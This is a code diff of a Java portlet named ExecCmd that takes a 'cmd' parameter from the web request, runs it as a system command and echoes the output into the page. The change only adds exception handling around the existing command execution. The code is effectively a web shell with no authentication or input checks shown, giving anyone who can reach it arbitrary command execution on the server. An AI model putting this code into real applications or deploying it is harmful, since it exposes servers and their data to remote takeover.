@@ -41,22 +41,27 @@ public class ExecCmd extends GenericPortlet {
 
 		String cmd=request.getParameter(response.getNamespace()+"cmd");
 
-		if (cmd == null) {
-			writer.println("<p>No command to execute</p>");
-		} else {
-			cmd = cmdprefix + cmd;
-			writer.println("<p>Executing: "+cmd+"</p>");
-			writer.println("<hr><pre>");
-			Process p = Runtime.getRuntime().exec(cmd);
-			OutputStream os = p.getOutputStream();
-			InputStream in = p.getInputStream();
-			DataInputStream dis = new DataInputStream(in);
-			String disr = dis.readLine();
-			while ( disr != null ) {
-				writer.println(disr);
-				disr = dis.readLine();
+		try {
+			if (cmd == null) {
+				writer.println("<p>No command to execute</p>");
+			} else {
+				cmd = cmdprefix + cmd;
+				writer.println("<p>Executing: "+cmd+"</p>");
+				writer.println("<hr><pre>");
+				Process p = Runtime.getRuntime().exec(cmd);
+				OutputStream os = p.getOutputStream();
+				InputStream in = p.getInputStream();
+				DataInputStream dis = new DataInputStream(in);
+				String disr = dis.readLine();
+				while ( disr != null ) {
+					writer.println(disr);
+					disr = dis.readLine();
+				}
+				writer.println("</pre><hr>");
 			}
-			writer.println("</pre><hr>");
+		} 
+		catch(Exception e) {
+			writer.println("<p><pre>Exception: "+ e.toString() +"</pre></p>");
 		}
 
 	}
